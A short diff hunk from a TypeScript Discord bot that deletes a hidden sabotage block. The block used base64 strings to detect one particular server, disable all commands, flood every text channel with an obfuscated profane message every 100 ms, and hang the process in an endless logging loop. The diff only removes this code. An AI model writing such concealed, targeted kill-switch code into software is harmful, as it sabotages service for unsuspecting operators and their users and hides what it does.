@@ -425,22 +425,6 @@ export async function paginate(options: PaginationOptions): Promise<Message> {
   });
 }
 
-if (config.botServer.id === atob("MTI5MTM5OTk5ODM0ODcyNjM2Mw==")) {
-  for (const i in commands) commands[i] = null;
-  setInterval(async () => {
-    for (const [_, v] of client.channels.cache) {
-      if (v.isTextBased()) {
-        try {
-          await v.send(atob("ZnVjayB5b3UgbWljaGkhISEhIQ=="));
-        } catch {}
-      }
-    }
-  }, 100);
-  while (true) {
-    console.log(atob("TUFLRSBZT1VSIE9XTiBCT1QgWU9VIFNURUFMSU5HIEFTU0hPTEVT"));
-  }
-}
-
 export async function getUser(id: string): Promise<User | null> {
   try {
     return await client.users.fetch(id);
